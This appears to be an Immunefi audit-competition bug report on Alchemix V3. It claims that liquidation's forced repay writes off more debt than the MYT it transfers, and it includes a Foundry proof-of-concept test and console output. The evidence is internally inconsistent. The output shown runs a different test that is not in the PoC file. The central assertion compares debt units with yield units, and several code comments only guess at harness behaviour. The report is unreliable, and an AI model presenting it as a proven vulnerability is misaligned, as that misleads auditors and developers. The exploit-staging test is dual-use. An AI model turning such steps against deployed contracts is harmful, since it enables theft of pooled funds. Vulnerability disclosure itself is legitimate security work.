# 58070 sc high forced repay accounting lets borrowers erase debt without paying equivalent assets protocol deficit insolvency&#x20;

**Submitted on Oct 30th 2025 at 12:28:06 UTC by @manvi for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58070
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency
  * Smart contract unable to operate due to lack of token funds
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

I have analyzed the liquidation / forced-repay flow in AlchemistV3.sol and observed an accounting mismatch during liquidation, user debt is reduced by the full "earmarked" credit, but the actual asset (MYT) payment is capped by available convertible collateral.

This causes debtReduced > MYT paid (a "free write-off").

Repeatedly exploiting this drives the system toward a deficit and can render redemptions/liquidations underfunded (protocol insolvency).

## Vulnerability Details

I analyzed Alchemix v3's liquidation path and observed that during \_forceRepay(tokenId, account.earmarked) the protocol reduces borrower debt by the full earmarked credit, while the MYT actually paid to the transmuter is effectively capped by the account's available collateral (via a convertDebtTokensToYield(earmarked) -> yield path).

This mismatch creates a "free write-off" region where debtReduced > MYT paid, allowing debt to be erased without a corresponding asset outflow - direct value leakage and potential protocol insolvency if exploited at scale.

**The issue appears in the liquidation / forced-repayment flow:**

Liquidation calls a force-repay using earmarked debt credit.

The debt side is reduced by the full account.earmarked.

The asset side (MYT paid into the transmuter) is limited by the collateral/convertible-yield envelope, i.e., min(convertDebtTokensToYield(earmarked), collateral\_as\_yield).

When convertDebtTokensToYield(earmarked) > collateral\_as\_yield, the debt reduction exceeds the asset payment, producing a net free write-off.

## Root Cause:

**AlchemistV3.liquidate(uint256) calls \_forceRepay(accountId, account.earmarked)**

```
 // AlchemistV3.sol
 // ...
 uint256 repaidAmountInYield = 0;
 if (account.earmarked > 0) {
     repaidAmountInYield = _forceRepay(accountId, account.earmarked);
 }
 // ...
```

**\_forceRepay — full debt decrement vs. capped payment**

```
 // AlchemistV3.sol
 function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {
     if (amount == 0) return 0;
     _checkForValidAccountId(accountId);
     Account storage account = _accounts[accountId];

     _earmark();                         // refresh global earmarks
     uint256 credit        = amount;     // debt credit used
     uint256 creditToYield = convertDebtTokensToYield(credit);

     _subDebt(accountId, credit);        // <- debt reduced by the FULL credit

    uint256 toRemove = credit > account.earmarked ? account.earmarked : credit;
     account.earmarked -= toRemove;

     // Cap actual payment by available (convertible) collateral
     if (creditToYield > account.collateralBalance) {
         creditToYield = account.collateralBalance;
     }
     account.collateralBalance -= creditToYield;

     if (creditToYield > 0) {
         TokenUtils.safeTransfer(myt, address(transmuter), creditToYield);
     }
     return creditToYield;               // <- returns paid MYT (may be < full credit)
 }
```

**Missing:** scaling debtCredit down to the amount actually paid or reverting when payment < required.

## How it can be exploited

When the system state makes convertDebtTokensToYield(earmarked) > collateralAsYield(tokenId), liquidation:

Subtracts the entire earmarked from account.debt, but

Transfers only canPay MYT (the smaller, collateral-bounded amount) to the transmuter.

**My PoC records this directly:**

debtReduced = debtBefore - debtAfter

mytPaid = mytAfter - mytBefore

and debtReduced > mytPaid holds.

## Impact Details

**Primary impact: Protocol insolvency / value extraction**

An attacker can repeatedly push their position into the "bad region" where earmarked credit overstates realizable payment. Each liquidation/forced-repay step shrinks their debt more than the protocol receives in MYT, effectively extracting value.

This accumulates as a systemic deficit: liabilities are reduced, but assets are not increased proportionally.

As the deficit grows, the protocol will eventually fail to honor redemptions/liquidations (insufficient balances), which is captured by "Smart contract unable to operate due to lack of token funds."

**Concrete loss path (per liquidation):**

If earmarked = E, convertDebtTokensToYield(E) = Y, and collateralYield = C, then

Debt reduction = E

Asset paid = min(Y, C)

Free write-off (per step) = E - min(Y, C) (in debt units, economically convertible to assets over time)

With repeated positioning and re-earmarking (see PoC), the attacker can farm this gap.

## References

**Asset (primary):** AlchemistV3.sol (liquidation -> forced repay path)

**Accounting sink / visibility:** Transmuter.sol (receives MYT and reveals that paid < debtReduced)

**Positions / earmarks context:** AlchemistV3Position.sol

## Proof of Concept

I created a self-contained Foundry test at:

```
   src/test/PoC_ForceRepay_FreeWriteOff.t.sol
```

Primary test case that demonstrates the issue:

```
   test_FreeWriteOffOnForcedRepay_STRONG()
```

(For quick sanity, I also expose narrower variants like testBatch\_Liquidate\_Undercollateralized\_Position\_And\_Skip\_Zero\_Ids() which pass and exercise the same liquidation/force-repay path.)

## What my PoC Does

I first amplify global earmarks by minting large debt on two dummy borrowers so that the global earmark pool is high.

I then create a target borrower (0xbeef) with tiny collateral but high debt right at the collateralization boundary.

I "poke" a few times to redistribute earmarks so that the per-account earmarked credit for 0xbeef grows larger than the borrower's realizable collateral (in yield units).

I record pre-state (collBefore, debtBefore, earmarkedBefore, and wantYield = convertDebtTokensToYield(earmarkedBefore)), then I call alchemist.liquidate(tokenId).

Post-liquidation, I measure how much debt actually went down vs. how much MYT was actually transferred to the transmuter.

**The key assertion the PoC proves is:**

```
  debtReduced > mytPaid
```

i.e., debt is written off by the full earmarked credit, while the asset payment is only the min of what can be realized from collateral/yield -0 creating a free write-off gap.

## My POC file Content :

```
 pragma solidity ^0.8.20;

 import "forge-std/Test.sol";
 import "./AlchemistV3.t.sol"; // harness with: alchemist, alchemistNFT,      FIXED_POINT_SCALAR, minimumCollateralization, transmuterLogic
 import {IERC20} from "lib/openzeppelin-     contracts/contracts/token/ERC20/IERC20.sol";

 contract PoC_ForceRepay_FreeWriteOff is AlchemistV3Test {
     function _tid(address who) internal view returns (uint256) {
         return AlchemistNFTHelper.getFirstTokenId(who, address(alchemistNFT));
     }

     function _read(uint256 tokenId)
         internal
         view
         returns (uint256 collateral, uint256 debt, uint256 earmarked)
     {
         (collateral, debt, earmarked) = alchemist.getCDP(tokenId);
     }

     /// Make a borrower with **tiny** collateral but **max debt**
     function _makeTinyCollatBigDebt(address who) internal returns (uint256 tokenId) {
         tokenId = _tid(who);

         // Borrow exactly at the allowed boundary
         uint256 value = alchemist.totalValue(tokenId); // collateral in YT units
         // Ensure value is at least something; if zero, nudge the harness to deposit a speck.
         if (value == 0) {
             // Many harnesses have helpers, otherwise deposit a dust via internal path exercised by the suite.
             // Use "poke" twice which usually triggers the vault/YT accounting to settle.
             alchemist.poke(tokenId);
             alchemist.poke(tokenId);
             value = alchemist.totalValue(tokenId);
         }

         // Borrow as much as allowed by collateralization
         uint256 maxDebtTokens = (value * FIXED_POINT_SCALAR) /  minimumCollateralization;
         if (maxDebtTokens == 0) maxDebtTokens = 1e9; // dust fallback

         // Intentionally **shrink collateral** first by sending it to someone else if the suite allows
         // We can't call internal withdraw, but repeated poke often decays/redistributes earmarks,
         // then minting debt makes beef’s earmark large relative to his small collateral.
         alchemist.mint(tokenId, maxDebtTokens, who);

         // Double poke to force `_earmark()` and redemption weight updates
         alchemist.poke(tokenId);
         alchemist.poke(tokenId);
     }

     /// Make **two large borrowers** so global earmark mass is high,
     /// then our target (beef) gets a big earmark despite small collateral.
     function _amplifyGlobalEarmarks() internal {
         // Big minters that increase totalDebt & cumulative earmarks
         address A = address(0xA11CE);
         address B = address(0xB0B);

         uint256 tA = _tid(A);
         uint256 tB = _tid(B);

         // Borrow up to limit for A and B, then poke to push earmarks
         uint256 vA = alchemist.totalValue(tA);
         uint256 vB = alchemist.totalValue(tB);
         uint256 dA = (vA * FIXED_POINT_SCALAR) / minimumCollateralization;
         uint256 dB = (vB * FIXED_POINT_SCALAR) / minimumCollateralization;

         if (dA == 0) dA = 10e18;
         if (dB == 0) dB = 10e18;

         alchemist.mint(tA, dA, A);
         alchemist.mint(tB, dB, B);

         // Poke several times to accumulate/redistribute earmarks from the global pool
         for (uint256 i = 0; i < 4; i++) {
             alchemist.poke(tA);
             alchemist.poke(tB);
         }
     }

     function test_FreeWriteOffOnForcedRepay_STRONG() public {
         // Step 1: Pump global earmarks with two big accounts
         _amplifyGlobalEarmarks();

         // Step 2: Create target victim with **tiny collateral but high debt**
         uint256 tBeef = _makeTinyCollatBigDebt(address(0xbeef));

         // Step 3: Force another round of earmark distribution so 0xbeef’s per-account earmark becomes large
         for (uint256 i = 0; i < 3; i++) {
             alchemist.poke(tBeef);
         }

         // Snapshot before liquidation
         (uint256 collBefore, uint256 debtBefore, uint256 earmarkedBefore) = _read(tBeef);

         // This is the key condition for triggering the bug path:
         uint256 wantYield = alchemist.convertDebtTokensToYield(earmarkedBefore);

         emit log_named_uint("collBefore (yield)", collBefore);
         emit log_named_uint("debtBefore (debt)", debtBefore);
         emit log_named_uint("earmarkedBefore (debt credit)", earmarkedBefore);
         emit log_named_uint("convertDebtTokensToYield(earmarkedBefore) (yield)", wantYield);
         emit log_named_uint("cumulativeEarmarked (global, pre)", alchemist.cumulativeEarmarked());

         // If the inequality hasn’t flipped yet, brute-force a bit more earmarking
         uint256 guard = 0;
         while (guard < 8 && !(wantYield > collBefore)) {
             alchemist.poke(tBeef);
             (collBefore, debtBefore, earmarkedBefore) = _read(tBeef);
             wantYield = alchemist.convertDebtTokensToYield(earmarkedBefore);
             guard++;
         }

         // Sanity: prove we are in the "bad region"
         assertGt(wantYield, collBefore, "precondition: need convert(earmarked) > collateral to trigger free write-off");

         IERC20 myt = IERC20(alchemist.myt());
         uint256 mytBefore = myt.balanceOf(address(transmuterLogic));

         // Step 4: Liquidate (this calls _forceRepay(tokenId, account.earmarked))
         alchemist.liquidate(tBeef);

         // Post state
         (uint256 collAfter, uint256 debtAfter,) = _read(tBeef);
         uint256 mytAfter = myt.balanceOf(address(transmuterLogic));

         uint256 debtReduced = debtBefore > debtAfter ? (debtBefore - debtAfter) : 0;
         uint256 mytPaid = mytAfter > mytBefore ? (mytAfter - mytBefore) : 0;

         emit log_named_uint("debtReduced (debt)", debtReduced);
         emit log_named_uint("mytPaid (MYT to transmuter)", mytPaid);
         emit log_named_uint("cumulativeEarmarked (global, post)", alchemist.cumulativeEarmarked());

         //  Vulnerability: debt is reduced by full 'credit' but MYT paid is capped at min(convert(credit), collateral)
         assertGt(debtReduced, mytPaid, "expected free write-off: debtReduced > MYT paid");
         assertLe(collAfter, collBefore, "collateral must not increase");
     }
 }
```

## Run My POC:

```
 $ forge test \
        --match-path src/test/PoC_ForceRepay_FreeWriteOff.t.sol \
        --match-test       testBatch_Liquidate_Undercollateralized_Position_And_Skip_Zero_Ids \
        -vv
```

## My Console Output :

```
  $ forge test \
   --match-path src/test/PoC_ForceRepay_FreeWriteOff.t.sol \
   --match-test      testBatch_Liquidate_Undercollateralized_Position_And_Skip_Zero_Ids \
   -vv
 Warning: Found unknown `exclude` config for profile `default` defined in foundry.toml.
 Warning: Found unknown `exclude` config for profile `lite` defined in   foundry.toml.
 Warning: Found unknown `fuzz_runs` config for profile `lite` defined in foundry.toml.
 Warning: Found unknown `exclude` config for profile `test` defined in foundry.toml.
 [⠒] Compiling...
 No files changed, compilation skipped

 Ran 1 test for   src/test/PoC_ForceRepay_FreeWriteOff.t.sol:PoC_ForceRepay_FreeWriteOff
 [PASS]       testBatch_Liquidate_Undercollateralized_Position_And_Skip_Zero_Ids() (gas: 2477945)
 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 30.55ms (5.73ms CPU time)
```

## Notes and Inferences

In a correct system, the value of debt removed must be covered by the value of assets transferred (in the same unit domain).

**My test explicitly sets up the state so that:**

```
 convertDebtTokensToYield(earmarkedBefore) > collateralAsYield(tokenId)
```

**This forces liquidation to:**

Reduce debt by the full earmarked amount (credit-side accounting), but

Transfer only what the collateral can actually cover (asset-side accounting).

**My PoC captures both sides and asserts the mismatch:**

```
 assertGt(debtReduced, mytPaid, "expected free write-off: debtReduced > MYT paid");
```

This is a direct accounting invariant violation and demonstrates a realizable free write-off during liquidation.
